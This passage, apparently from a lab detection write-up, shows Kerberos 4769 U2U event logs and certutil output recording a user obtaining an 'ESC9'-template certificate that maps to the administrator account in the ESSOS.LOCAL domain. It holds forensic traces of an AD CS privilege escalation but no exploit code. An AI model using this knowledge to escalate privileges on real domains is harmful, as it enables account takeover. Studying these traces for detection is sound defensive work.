  <Data Name="ClientAdvertizedEncryptionTypes">AES256-CTS-HMAC-SHA1-96 AES128-CTS-HMAC-SHA1-96</Data> 
  <Data Name="SessionKeyEncryptionType">0x12</Data> 
  <Data Name="PreAuthEncryptionType">0x0</Data> 
  </EventData>
  </Event>
```

### 4769 TGS U2U Request
```
A Kerberos service ticket was requested.

Account Information:
	Account Name:		administrator@ESSOS.LOCAL
	Account Domain:		ESSOS.LOCAL
	Logon GUID:		{117c8b63-5eec-78fb-caac-efee2e355693}
	MSDS-SupportedEncryptionTypes:	N/A
	Available Keys:	N/A

Service Information:
	Service Name:		Administrator
	Service ID:		ESSOS\Administrator
	MSDS-SupportedEncryptionTypes:	0x27 (DES, RC4, AES-Sk)
	Available Keys:	RC4

Domain Controller Information:
	MSDS-SupportedEncryptionTypes:	0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)
	Available Keys:	AES-SHA1, RC4

Network Information:
	Client Address:		::ffff:192.168.56.101
	Client Port:		63637
	Advertized Etypes:	
		AES256-CTS-HMAC-SHA1-96
		RC4-HMAC-NT

Additional Information:
	Ticket Options:		0x40810018
	Ticket Encryption Type:	0x12
	Session Encryption Type:	0x12
	Failure Code:		0x0
	Transited Services:	-

Ticket information
	Request ticket hash:		N/A	Response ticket hash:		N/A
This event is generated every time access is requested to a resource such as a computer or a Windows service.  The service name indicates the resource to which access was requested.

This event can be correlated with Windows logon events by comparing the Logon GUID fields in each event.  The logon event occurs on the machine that was accessed, which is often a different machine than the domain controller which issued the service ticket.

Pre-authentication types, ticket options, encryption types and result codes are defined in RFC 4120.
```
```xml
A Kerberos service ticket was requested.

Account Information:
	Account Name:		administrator@ESSOS.LOCAL
	Account Domain:		ESSOS.LOCAL
	Logon GUID:		{117c8b63-5eec-78fb-caac-efee2e355693}
	MSDS-SupportedEncryptionTypes:	N/A
	Available Keys:	N/A

Service Information:
	Service Name:		Administrator
	Service ID:		ESSOS\Administrator
	MSDS-SupportedEncryptionTypes:	0x27 (DES, RC4, AES-Sk)
	Available Keys:	RC4

Domain Controller Information:
	MSDS-SupportedEncryptionTypes:	0x1F (DES, RC4, AES128-SHA96, AES256-SHA96)
	Available Keys:	AES-SHA1, RC4

Network Information:
	Client Address:		::ffff:192.168.56.101
	Client Port:		63637
	Advertized Etypes:	
		AES256-CTS-HMAC-SHA1-96
		RC4-HMAC-NT

Additional Information:
	Ticket Options:		0x40810018
	Ticket Encryption Type:	0x12
	Session Encryption Type:	0x12
	Failure Code:		0x0
	Transited Services:	-

Ticket information
	Request ticket hash:		N/A	Response ticket hash:		N/A
This event is generated every time access is requested to a resource such as a computer or a Windows service.  The service name indicates the resource to which access was requested.

This event can be correlated with Windows logon events by comparing the Logon GUID fields in each event.  The logon event occurs on the machine that was accessed, which is often a different machine than the domain controller which issued the service ticket.

Pre-authentication types, ticket options, encryption types and result codes are defined in RFC 4120.
```

### certutil output

<details>
<summary>Output of certuril tool</summary>

```
certutil.exe -v -view -restrict "RequestID=85" -gmt -out Request.RequestID,Request.RawRequest,Request.RawArchivedKey,Request.KeyRecoveryHashes,Request.RawOldCertificate,Request.RequestAttributes,Request.RequestType,Request.RequestFlags,Request.StatusCode,Request.Disposition,Request.DispositionMessage,Request.SubmittedWhen,Request.ResolvedWhen,Request.RevokedWhen,Request.RevokedEffectiveWhen,Request.RevokedReason,Request.RequesterName,Request.CallerName,Request.SignerPolicies,Request.SignerApplicationPolicies,Request.Officer,Request.DistinguishedName,Request.RawName,Request.Country,Request.Organization,Request.OrgUnit,Request.CommonName,Request.Locality,Request.State,Request.Title,Request.GivenName,Request.Initials,Request.SurName,Request.DomainComponent,Request.EMail,Request.StreetAddress,Request.UnstructuredName,Request.UnstructuredAddress,Request.DeviceSerialNumber,Request.AttestationChallenge,Request.EndorsementKeyHash,Request.EndorsementCertificateHash,Request.RawPrecertificate,RequestID,RawCertificate,CertificateHash,CertificateTemplate,EnrollmentFlags,GeneralFlags,PrivatekeyFlags,SerialNumber,IssuerNameID,NotBefore,NotAfter,SubjectKeyIdentifier,RawPublicKey,PublicKeyLength,PublicKeyAlgorithm,RawPublicKeyAlgorithmParameters,PublishExpiredCertInCRL,UPN,DistinguishedName,RawName,Country,Organization,OrgUnit,CommonName,Locality,State,Title,GivenName,Initials,SurName,DomainComponent,EMail,StreetAddress,UnstructuredName,UnstructuredAddress,DeviceSerialNumber
Schema:
  Column Name                   Localized Name                Type    MaxLength
  ----------------------------  ----------------------------  ------  ---------
  Request.RequestID             Request ID                    Long    4 -- Indexed
  Request.RawRequest            Binary Request                Binary  65536
  Request.RawArchivedKey        Archived Key                  Binary  65536
  Request.KeyRecoveryHashes     Key Recovery Agent Hashes     String  8192
  Request.RawOldCertificate     Old Certificate               Binary  16384
  Request.RequestAttributes     Request Attributes            String  32768
  Request.RequestType           Request Type                  Long    4
  Request.RequestFlags          Request Flags                 Long    4
  Request.StatusCode            Request Status Code           Long    4
  Request.Disposition           Request Disposition           Long    4 -- Indexed
  Request.DispositionMessage    Request Disposition Message   String  8192
  Request.SubmittedWhen         Request Submission Date       Date    8 -- Indexed
  Request.ResolvedWhen          Request Resolution Date       Date    8 -- Indexed
  Request.RevokedWhen           Revocation Date               Date    8
  Request.RevokedEffectiveWhen  Effective Revocation Date     Date    8 -- Indexed
  Request.RevokedReason         Revocation Reason             Long    4
  Request.RequesterName         Requester Name                String  2048 -- Indexed
  Request.CallerName            Caller Name                   String  2048 -- Indexed
  Request.SignerPolicies        Signer Policies               String  8192
  Request.SignerApplicationPolicies  Signer Application Policies   String  8192
  Request.Officer               Officer                       Long    4
  Request.DistinguishedName     Request Distinguished Name    String  8192
  Request.RawName               Request Binary Name           Binary  4096
  Request.Country               Request Country/Region        String  8192
  Request.Organization          Request Organization          String  8192
  Request.OrgUnit               Request Organization Unit     String  8192
  Request.CommonName            Request Common Name           String  8192
  Request.Locality              Request City                  String  8192
  Request.State                 Request State                 String  8192
  Request.Title                 Request Title                 String  8192
  Request.GivenName             Request First Name            String  8192
  Request.Initials              Request Initials              String  8192
  Request.SurName               Request Last Name             String  8192
  Request.DomainComponent       Request Domain Component      String  8192
  Request.EMail                 Request Email Address         String  8192
  Request.StreetAddress         Request Street Address        String  8192
  Request.UnstructuredName      Request Unstructured Name     String  8192
  Request.UnstructuredAddress   Request Unstructured Address  String  8192
  Request.DeviceSerialNumber    Request Device Serial Number  String  8192
  Request.AttestationChallenge  Attestation Challenge         Binary  4096
  Request.EndorsementKeyHash    Endorsement Key Hash          String  144 -- Indexed
  Request.EndorsementCertificateHash  Endorsement Certificate Hash  String  144 -- Indexed
  Request.RawPrecertificate     Binary Precertificate         Binary  16384
  RequestID                     Issued Request ID             Long    4 -- Indexed
  RawCertificate                Binary Certificate            Binary  16384
  CertificateHash               Certificate Hash              String  128 -- Indexed
  CertificateTemplate           Certificate Template          String  254 -- Indexed
  EnrollmentFlags               Template Enrollment Flags     Long    4
  GeneralFlags                  Template General Flags        Long    4
  PrivatekeyFlags               Template Private Key Flags    Long    4
  SerialNumber                  Serial Number                 String  128 -- Indexed
  IssuerNameID                  Issuer Name ID                Long    4
  NotBefore                     Certificate Effective Date    Date    8
  NotAfter                      Certificate Expiration Date   Date    8 -- Indexed
  SubjectKeyIdentifier          Issued Subject Key Identifier  String  128 -- Indexed
  RawPublicKey                  Binary Public Key             Binary  4096
  PublicKeyLength               Public Key Length             Long    4
  PublicKeyAlgorithm            Public Key Algorithm          String  254
  RawPublicKeyAlgorithmParameters  Public Key Algorithm Parameters  Binary  4096
  PublishExpiredCertInCRL       Publish Expired Certificate in CRL  Long    4
  UPN                           User Principal Name           String  2048 -- Indexed
  DistinguishedName             Issued Distinguished Name     String  8192
  RawName                       Issued Binary Name            Binary  4096
  Country                       Issued Country/Region         String  8192
  Organization                  Issued Organization           String  8192
  OrgUnit                       Issued Organization Unit      String  8192
  CommonName                    Issued Common Name            String  8192 -- Indexed
  Locality                      Issued City                   String  8192
  State                         Issued State                  String  8192
  Title                         Issued Title                  String  8192
  GivenName                     Issued First Name             String  8192
  Initials                      Issued Initials               String  8192
  SurName                       Issued Last Name              String  8192
  DomainComponent               Issued Domain Component       String  8192
  EMail                         Issued Email Address          String  8192
  StreetAddress                 Issued Street Address         String  8192
  UnstructuredName              Issued Unstructured Name      String  8192
  UnstructuredAddress           Issued Unstructured Address   String  8192
  DeviceSerialNumber            Issued Device Serial Number   String  8192

Row 1:
  Request ID: 0x55 (85)
  Binary Request:
-----BEGIN NEW CERTIFICATE REQUEST-----
MIICYTCCAUkCAQAwHDEaMBgGA1UEAwwRVmlzZXJ5cy50YXJnYXJ5ZW4wggEiMA0G
CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCQ30p0+q69MZMNnAIdekqun0WO9YS1
xlC8qagqNt3yB/NWooLPoxB9FEUzRAEqbQl4Ihn94HEWumZdHjqKnHY6UgaNUmwD
dDs2rei+19z1xnUc3SHExm9PJ9Q3lpuWeTd+sqhjO+Nan/Hz+8vdDJoEeD5YHhge
3xQ3Mc1uwyatxSpPAM0m0Sq4lTN3jpaKqai6IBUvaM65cQfJecbUv5WmKB0quVu+
+gJfAyBWdXpJ1P00E4pcRzjfj43b2u6pM2nK1Esop8RdLSxAtHNm3N/QxY6Jzcjc
7hntoa1T1rXInZSAlySMV4Ve4IFP5aKvVVL0Hky62q542T8rWSz6Ty3HAgMBAAGg
ADANBgkqhkiG9w0BAQsFAAOCAQEACelKg0oDebAP2vq5Le1FgBhT1c3BP6cdEY0p
tyQrsn/AA6HNcoT7Eudr7xDvWx7qBK8CIeGnnaW4dkJ+xPTwQutmDLiQ4DTnUjQ3
62vhfNWKJFqixICbs0NHKhLQYFVbonr1HW6PnYmC4aZhHwMFHPBf7AXnlUY6gXiD
qTSxCoqjdtnIChEt5OMTtP9bXsrXyX6GSBIhXh1ZYl0s4318c+FLgarXzPp8f2Kf
XCa5FmU48inskTOfJvjFEsdWLVguhD9Z4lg77Ptgsb4wt3+vl1dcgotQfb09Ve65
lcECHTeQKO1xJkE0nqFPOVuRM2wVeTGzPY745bicRXKw7MJ6Fg==
-----END NEW CERTIFICATE REQUEST-----

PKCS10 Certificate Request:
Version: 1
Subject:
    CN=Viserys.targaryen
  Name Hash(sha1): 6a9f65aad7b9c0b669f63368987c5922e851c9ef
  Name Hash(md5): 4f44096017c4181d7daaade25b2d1b7b

Public Key Algorithm:
    Algorithm ObjectId: 1.2.840.113549.1.1.1 RSA (RSA_SIGN)
    Algorithm Parameters:
    05 00
Public Key Length: 2048 bits
Public Key: UnusedBits = 0
    0000  30 82 01 0a 02 82 01 01  00 90 df 4a 74 fa ae bd
    0010  31 93 0d 9c 02 1d 7a 4a  ae 9f 45 8e f5 84 b5 c6
    0020  50 bc a9 a8 2a 36 dd f2  07 f3 56 a2 82 cf a3 10
    0030  7d 14 45 33 44 01 2a 6d  09 78 22 19 fd e0 71 16
    0040  ba 66 5d 1e 3a 8a 9c 76  3a 52 06 8d 52 6c 03 74
    0050  3b 36 ad e8 be d7 dc f5  c6 75 1c dd 21 c4 c6 6f
    0060  4f 27 d4 37 96 9b 96 79  37 7e b2 a8 63 3b e3 5a
    0070  9f f1 f3 fb cb dd 0c 9a  04 78 3e 58 1e 18 1e df
    0080  14 37 31 cd 6e c3 26 ad  c5 2a 4f 00 cd 26 d1 2a
    0090  b8 95 33 77 8e 96 8a a9  a8 ba 20 15 2f 68 ce b9
    00a0  71 07 c9 79 c6 d4 bf 95  a6 28 1d 2a b9 5b be fa
    00b0  02 5f 03 20 56 75 7a 49  d4 fd 34 13 8a 5c 47 38
    00c0  df 8f 8d db da ee a9 33  69 ca d4 4b 28 a7 c4 5d
    00d0  2d 2c 40 b4 73 66 dc df  d0 c5 8e 89 cd c8 dc ee
    00e0  19 ed a1 ad 53 d6 b5 c8  9d 94 80 97 24 8c 57 85
    00f0  5e e0 81 4f e5 a2 af 55  52 f4 1e 4c ba da ae 78
    0100  d9 3f 2b 59 2c fa 4f 2d  c7 02 03 01 00 01
Request Attributes: 0
  0 attributes:
Signature Algorithm:
    Algorithm ObjectId: 1.2.840.113549.1.1.11 sha256RSA
    Algorithm Parameters:
    05 00
Signature: UnusedBits=0
    0000  16 7a c2 ec b0 72 45 9c  b8 e5 f8 8e 3d b3 31 79
    0010  15 6c 33 91 5b 39 4f a1  9e 34 41 26 71 ed 28 90
    0020  37 1d 02 c1 95 b9 ee 55  3d bd 7d 50 8b 82 5c 57
    0030  97 af 7f b7 30 be b1 60  fb ec 3b 58 e2 59 3f 84
    0040  2e 58 2d 56 c7 12 c5 f8  26 9f 33 91 ec 29 f2 38
    0050  65 16 b9 26 5c 9f 62 7f  7c fa cc d7 aa 81 4b e1
    0060  73 7c 7d e3 2c 5d 62 59  1d 5e 21 12 48 86 7e c9
    0070  d7 ca 5e 5b ff b4 13 e3  e4 2d 11 0a c8 d9 76 a3
    0080  8a 0a b1 34 a9 83 78 81  3a 46 95 e7 05 ec 5f f0
    0090  1c 05 03 1f 61 a6 e1 82  89 9d 8f 6e 1d f5 7a a2
    00a0  5b 55 60 d0 12 2a 47 43  b3 9b 80 c4 a2 5a 24 8a
    00b0  d5 7c e1 6b eb 37 34 52  e7 34 e0 90 b8 0c 66 eb
    00c0  42 f0 f4 c4 7e 42 76 b8  a5 9d a7 e1 21 02 af 04
    00d0  ea 1e 5b ef 10 ef 6b e7  12 fb 84 72 cd a1 03 c0
    00e0  7f b2 2b 24 b7 29 8d 11  1d a7 3f c1 cd d5 53 18
    00f0  80 45 ed 2d b9 fa da 0f  b0 79 03 4a 83 4a e9 09
Signature matches Public Key
Key Id Hash(rfc-sha1): 062f87bdedfb3456dd00b47d8eb757f059d29de6
Key Id Hash(sha1): c232b4f7155627ec68b734dd2f5f50395d643c41
Key Id Hash(bcrypt-sha1): d793f311b64572a96ba96e55badc14047259c1d0
Key Id Hash(bcrypt-sha256): 275cc1118501a24bd9a27279ed9f9e1a1d875f396faebef6fab7980079807846

  Archived Key: EMPTY
  Key Recovery Agent Hashes: EMPTY
  Old Certificate: EMPTY
  Request Attributes: "CertificateTemplate:ESC9"
0000    43 00 65 00 72 00 74 00  69 00 66 00 69 00 63 00   C.e.r.t.i.f.i.c.
0010    61 00 74 00 65 00 54 00  65 00 6d 00 70 00 6c 00   a.t.e.T.e.m.p.l.
0020    61 00 74 00 65 00 3a 00  45 00 53 00 43 00 39 00   a.t.e.:.E.S.C.9.

  Request Type: 0x100 (256) -- PKCS10
  Request Flags: 0x4 -- Force UTF-8
  Request Status Code: 0x0 (WIN32: 0) -- The operation completed successfully.
  Request Disposition: 0x14 (20) -- Issued
  Request Disposition Message: "Issued"
0000    49 00 73 00 73 00 75 00  65 00 64 00               I.s.s.u.e.d.

  Request Submission Date: 8/17/2025 6:35 PM GMT
  Request Resolution Date: 8/17/2025 6:35 PM GMT
  Revocation Date: EMPTY
  Effective Revocation Date: EMPTY
  Revocation Reason: EMPTY
  Requester Name: "ESSOS\viserys.targaryen"
0000    45 00 53 00 53 00 4f 00  53 00 5c 00 76 00 69 00   E.S.S.O.S.\.v.i.
0010    73 00 65 00 72 00 79 00  73 00 2e 00 74 00 61 00   s.e.r.y.s...t.a.
0020    72 00 67 00 61 00 72 00  79 00 65 00 6e 00         r.g.a.r.y.e.n.

  Caller Name: "ESSOS\viserys.targaryen"
0000    45 00 53 00 53 00 4f 00  53 00 5c 00 76 00 69 00   E.S.S.O.S.\.v.i.
0010    73 00 65 00 72 00 79 00  73 00 2e 00 74 00 61 00   s.e.r.y.s...t.a.
0020    72 00 67 00 61 00 72 00  79 00 65 00 6e 00         r.g.a.r.y.e.n.

  Signer Policies: EMPTY
  Signer Application Policies: EMPTY
  Officer: EMPTY
  Request Distinguished Name: "CN=Viserys.targaryen"
0000    43 00 4e 00 3d 00 56 00  69 00 73 00 65 00 72 00   C.N.=.V.i.s.e.r.
0010    79 00 73 00 2e 00 74 00  61 00 72 00 67 00 61 00   y.s...t.a.r.g.a.
0020    72 00 79 00 65 00 6e 00                            r.y.e.n.

  Request Binary Name:
0000    30 1c 31 1a 30 18 06 03  55 04 03 0c 11 56 69 73   0.1.0...U....Vis
0010    65 72 79 73 2e 74 61 72  67 61 72 79 65 6e         erys.targaryen

  Request Country/Region: EMPTY
  Request Organization: EMPTY
  Request Organization Unit: EMPTY
  Request Common Name: "Viserys.targaryen"
0000    56 00 69 00 73 00 65 00  72 00 79 00 73 00 2e 00   V.i.s.e.r.y.s...
0010    74 00 61 00 72 00 67 00  61 00 72 00 79 00 65 00   t.a.r.g.a.r.y.e.
0020    6e 00                                              n.

  Request City: EMPTY
  Request State: EMPTY
  Request Title: EMPTY
  Request First Name: EMPTY
  Request Initials: EMPTY
  Request Last Name: EMPTY
  Request Domain Component: EMPTY
  Request Email Address: EMPTY
  Request Street Address: EMPTY
  Request Unstructured Name: EMPTY
  Request Unstructured Address: EMPTY
  Request Device Serial Number: EMPTY
  Attestation Challenge: EMPTY
  Endorsement Key Hash: EMPTY
  Endorsement Certificate Hash: EMPTY
  Binary Precertificate: EMPTY
  Issued Request ID: 0x55 (85)
  Binary Certificate:
-----BEGIN CERTIFICATE-----
MIIFvjCCBKagAwIBAgITIAAAAFW213K6ewbV6gAAAAAAVTANBgkqhkiG9w0BAQsF
ADBBMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxFTATBgoJkiaJk/IsZAEZFgVlc3Nv
czERMA8GA1UEAxMIRVNTT1MtQ0EwHhcNMjUwODE3MTgyNTM1WhcNMjYwODE3MTgy
NTM1WjAAMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkN9KdPquvTGT
DZwCHXpKrp9FjvWEtcZQvKmoKjbd8gfzVqKCz6MQfRRFM0QBKm0JeCIZ/eBxFrpm
XR46ipx2OlIGjVJsA3Q7Nq3ovtfc9cZ1HN0hxMZvTyfUN5ablnk3frKoYzvjWp/x
8/vL3QyaBHg+WB4YHt8UNzHNbsMmrcUqTwDNJtEquJUzd46WiqmouiAVL2jOuXEH
yXnG1L+VpigdKrlbvvoCXwMgVnV6SdT9NBOKXEc434+N29ruqTNpytRLKKfEXS0s
QLRzZtzf0MWOic3I3O4Z7aGtU9a1yJ2UgJckjFeFXuCBT+Wir1VS9B5MutqueNk/
K1ks+k8txwIDAQABo4IC7jCCAuowHQYDVR0OBBYEFAYvh73t+zRW3QC0fY63V/BZ
0p3mMB8GA1UdIwQYMBaAFH1Oxx0zPzrvGpAOj09wpx5kq5TxMIHGBgNVHR8Egb4w
gbswgbiggbWggbKGga9sZGFwOi8vL0NOPUVTU09TLUNBLENOPWJyYWF2b3MsQ049
Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9ZXNzb3MsREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZvY2F0
aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIG6
BggrBgEFBQcBAQSBrTCBqjCBpwYIKwYBBQUHMAKGgZpsZGFwOi8vL0NOPUVTU09T
LUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNl
cyxDTj1Db25maWd1cmF0aW9uLERDPWVzc29zLERDPWxvY2FsP2NBQ2VydGlmaWNh
dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MA4GA1Ud
DwEB/wQEAwIFoDA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiB7vNvhajTA4bx
hQbIk12HqJkqgXimo+g7noSzIgIBZAIBBDApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwNQYJKwYBBAGCNxUKBCgwJjAKBggrBgEFBQcD
AjAKBggrBgEFBQcDBDAMBgorBgEEAYI3CgMEMCsGA1UdEQEB/wQhMB+gHQYKKwYB
BAGCNxQCA6APDA1hZG1pbmlzdHJhdG9yMEQGCSqGSIb3DQEJDwQ3MDUwDgYIKoZI
hvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDAHBgUrDgMCBzAKBggqhkiG9w0DBzAN
BgkqhkiG9w0BAQsFAAOCAQEAcfWcv/+9o4xTKW+W2pCAD7Y2rl4NzGtb+g+5pf0w
bjjpiGnsDEG0CGHVnWCydOaaXwTxbZUHgfpHv0cz88zTHaK4ws6mb+MomTRlrwUA
Szp60ZW+WyQ7gGxf3qWgUKFw8byGwZWrkI/Fhb0+flgZ6Jh2MT6ybD7SV8rFJULJ
GA7c1EmaK97e6ViMkamPRxi/9EWcqG7n/TzuKZosgxV07Ht5TkeoozyI9GbNDfpF
5pzYMMdhWbajlM0xhNisVk4W3C6LCjPWiL7G4hzil08r3Evdu/YMbk/JJjiegJWJ
OEtVVW6Zz6u9zCkszduPmL8yz3eYq8+ypXQ/LTeMh3zc6w==
-----END CERTIFICATE-----

X509 Certificate:
Version: 3
Serial Number: 2000000055b6d772ba7b06d5ea000000000055
Signature Algorithm:
    Algorithm ObjectId: 1.2.840.113549.1.1.11 sha256RSA
    Algorithm Parameters:
    05 00
Issuer:
    CN=ESSOS-CA
    DC=essos
    DC=local
  Name Hash(sha1): c555fa55fe8e3e84d965d463e888a73d1877edbc
  Name Hash(md5): 26df41790381580445365a074ae47bac

 NotBefore: 8/17/2025 6:25 PM GMT
 NotAfter: 8/17/2026 6:25 PM GMT

Subject:
    EMPTY (Other Name:Principal Name=administrator)
  Name Hash(sha1): f944dcd635f9801f7ac90a407fbc479964dec024
  Name Hash(md5): a46c3b54f2c9871cd81daf7a932499c0

Public Key Algorithm:
    Algorithm ObjectId: 1.2.840.113549.1.1.1 RSA
    Algorithm Parameters:
    05 00
Public Key Length: 2048 bits
Public Key: UnusedBits = 0
    0000  30 82 01 0a 02 82 01 01  00 90 df 4a 74 fa ae bd
    0010  31 93 0d 9c 02 1d 7a 4a  ae 9f 45 8e f5 84 b5 c6
    0020  50 bc a9 a8 2a 36 dd f2  07 f3 56 a2 82 cf a3 10
    0030  7d 14 45 33 44 01 2a 6d  09 78 22 19 fd e0 71 16
    0040  ba 66 5d 1e 3a 8a 9c 76  3a 52 06 8d 52 6c 03 74
    0050  3b 36 ad e8 be d7 dc f5  c6 75 1c dd 21 c4 c6 6f
    0060  4f 27 d4 37 96 9b 96 79  37 7e b2 a8 63 3b e3 5a
    0070  9f f1 f3 fb cb dd 0c 9a  04 78 3e 58 1e 18 1e df
    0080  14 37 31 cd 6e c3 26 ad  c5 2a 4f 00 cd 26 d1 2a
    0090  b8 95 33 77 8e 96 8a a9  a8 ba 20 15 2f 68 ce b9
    00a0  71 07 c9 79 c6 d4 bf 95  a6 28 1d 2a b9 5b be fa
    00b0  02 5f 03 20 56 75 7a 49  d4 fd 34 13 8a 5c 47 38
    00c0  df 8f 8d db da ee a9 33  69 ca d4 4b 28 a7 c4 5d
    00d0  2d 2c 40 b4 73 66 dc df  d0 c5 8e 89 cd c8 dc ee
    00e0  19 ed a1 ad 53 d6 b5 c8  9d 94 80 97 24 8c 57 85
    00f0  5e e0 81 4f e5 a2 af 55  52 f4 1e 4c ba da ae 78
    0100  d9 3f 2b 59 2c fa 4f 2d  c7 02 03 01 00 01
Certificate Extensions: 10
    2.5.29.14: Flags = 0, Length = 16
    Subject Key Identifier
        062f87bdedfb3456dd00b47d8eb757f059d29de6

    2.5.29.35: Flags = 0, Length = 18
    Authority Key Identifier
        KeyID=7d4ec71d333f3aef1a900e8f4f70a71e64ab94f1

    2.5.29.31: Flags = 0, Length = be
    CRL Distribution Points
        [1]CRL Distribution Point
             Distribution Point Name:
                  Full Name:
                       URL=ldap:///CN=ESSOS-CA,CN=braavos,CN=CDP,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local?certificateRevocationList?base?objectClass=cRLDistributionPoint (ldap:///CN=ESSOS-CA,CN=braavos,CN=CDP,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=essos,DC=local?certificateRevocationList?base?objectClass=cRLDistributionPoint)

    1.3.6.1.5.5.7.1.1: Flags = 0, Length = ad
    Authority Information Access
        [1]Authority Info Access
             Access Method=Certification Authority Issuer (1.3.6.1.5.5.7.48.2)
             Alternative Name:
                  URL=ldap:///CN=ESSOS-CA,CN=AIA,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local?cACertificate?base?objectClass=certificationAuthority (ldap:///CN=ESSOS-CA,CN=AIA,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=essos,DC=local?cACertificate?base?objectClass=certificationAuthority)

    2.5.29.15: Flags = 1(Critical), Length = 4
    Key Usage
        Digital Signature, Key Encipherment (a0)

    1.3.6.1.4.1.311.21.7: Flags = 0, Length = 30
    Certificate Template Information
        Template=ESC9(1.3.6.1.4.1.311.21.8.3914223.11151747.14434950.1182173.15338666.248.80278587.62986658)
        Major Version Number=100
        Minor Version Number=4

    2.5.29.37: Flags = 0, Length = 22
    Enhanced Key Usage
        Client Authentication (1.3.6.1.5.5.7.3.2)
        Secure Email (1.3.6.1.5.5.7.3.4)
        Encrypting File System (1.3.6.1.4.1.311.10.3.4)

    1.3.6.1.4.1.311.21.10: Flags = 0, Length = 28
    Application Policies
        [1]Application Certificate Policy:
             Policy Identifier=Client Authentication
        [2]Application Certificate Policy:
             Policy Identifier=Secure Email
        [3]Application Certificate Policy:
             Policy Identifier=Encrypting File System

    2.5.29.17: Flags = 1(Critical), Length = 21
    Subject Alternative Name
        Other Name:
             Principal Name=administrator

    1.2.840.113549.1.9.15: Flags = 0, Length = 37
    SMIME Capabilities
        [1]SMIME Capability
             Object ID=1.2.840.113549.3.2
             Parameters=02 02 00 80
        [2]SMIME Capability
             Object ID=1.2.840.113549.3.4
             Parameters=02 02 00 80
        [3]SMIME Capability
             Object ID=1.3.14.3.2.7
        [4]SMIME Capability
             Object ID=1.2.840.113549.3.7

Signature Algorithm:
    Algorithm ObjectId: 1.2.840.113549.1.1.11 sha256RSA
    Algorithm Parameters:
    05 00
Signature: UnusedBits=0
    0000  eb dc 7c 87 8c 37 2d 3f  74 a5 b2 cf ab 98 77 cf
    0010  32 bf 98 8f db cd 2c 29  cc bd ab cf 99 6e 55 55
    0020  4b 38 89 95 80 9e 38 26  c9 4f 6e 0c f6 bb dd 4b
    0030  dc 2b 4f 97 e2 1c e2 c6  be 88 d6 33 0a 8b 2e dc
    0040  16 4e 56 ac d8 84 31 cd  94 a3 b6 59 61 c7 30 d8
    0050  9c e6 45 fa 0d cd 66 f4  88 3c a3 a8 47 4e 79 7b
    0060  ec 74 15 83 2c 9a 29 ee  3c fd e7 6e a8 9c 45 f4
    0070  bf 18 47 8f a9 91 8c 58  e9 de de 2b 9a 49 d4 dc
    0080  0e 18 c9 42 25 c5 ca 57  d2 3e 6c b2 3e 31 76 98
    0090  e8 19 58 7e 3e bd 85 c5  8f 90 ab 95 c1 86 bc f1
    00a0  70 a1 50 a0 a5 de 5f 6c  80 3b 24 5b be 95 d1 7a
    00b0  3a 4b 00 05 af 65 34 99  28 e3 6f a6 ce c2 b8 a2
    00c0  1d d3 cc f3 33 47 bf 47  fa 81 07 95 6d f1 04 5f
    00d0  9a e6 74 b2 60 9d d5 61  08 b4 41 0c ec 69 88 e9
    00e0  38 6e 30 fd a5 b9 0f fa  5b 6b cc 0d 5e ae 36 b6
    00f0  0f 80 90 da 96 6f 29 53  8c a3 bd ff bf 9c f5 71
Non-root Certificate
Key Id Hash(rfc-sha1): 062f87bdedfb3456dd00b47d8eb757f059d29de6
Key Id Hash(sha1): c232b4f7155627ec68b734dd2f5f50395d643c41
Key Id Hash(bcrypt-sha1): d793f311b64572a96ba96e55badc14047259c1d0
Key Id Hash(bcrypt-sha256): 275cc1118501a24bd9a27279ed9f9e1a1d875f396faebef6fab7980079807846
Key Id Hash(md5): c0e3cfeeb15f591805d428270b8e2fc0
Key Id Hash(sha256): 79e54d97295342b2d436f267721b1666a26180948c2c80331a8925f6971bab0c
Key Id Hash(pin-sha256): 82HZ8sqkxj7hzUhDziZXEeniDSr52xhBqbUqAjNFprs=
Key Id Hash(pin-sha256-hex): f361d9f2caa4c63ee1cd4843ce265711e9e20d2af9db1841a9b52a023345a6bb
Cert Hash(md5): 19437215b531a8675857f93c0066feea
Cert Hash(sha1): 4f8bc10a30778dd3fdeecb7ecebaf2be66f1b2d9
Cert Hash(sha256): f1fc302abc85eaf0f2a4670019487a8f6ea13673a94c8677159a957a93f0889f
Signature Hash: e62a805b0b3214f8f68e00d2c80f4e8c72eb945326303bae7afe5765c40c3aad

  Certificate Hash: "4f 8b c1 0a 30 77 8d d3 fd ee cb 7e ce ba f2 be 66 f1 b2 d9"
0000    34 00 66 00 20 00 38 00  62 00 20 00 63 00 31 00   4.f. .8.b. .c.1.
0010    20 00 30 00 61 00 20 00  33 00 30 00 20 00 37 00    .0.a. .3.0. .7.
0020    37 00 20 00 38 00 64 00  20 00 64 00 33 00 20 00   7. .8.d. .d.3. .
0030    66 00 64 00 20 00 65 00  65 00 20 00 63 00 62 00   f.d. .e.e. .c.b.
0040    20 00 37 00 65 00 20 00  63 00 65 00 20 00 62 00    .7.e. .c.e. .b.
0050    61 00 20 00 66 00 32 00  20 00 62 00 65 00 20 00   a. .f.2. .b.e. .
0060    36 00 36 00 20 00 66 00  31 00 20 00 62 00 32 00   6.6. .f.1. .b.2.
0070    20 00 64 00 39 00                                   .d.9.

  Certificate Template: "1.3.6.1.4.1.311.21.8.3914223.11151747.14434950.1182173.15338666.248.80278587.62986658" ESC9
0000    31 00 2e 00 33 00 2e 00  36 00 2e 00 31 00 2e 00   1...3...6...1...
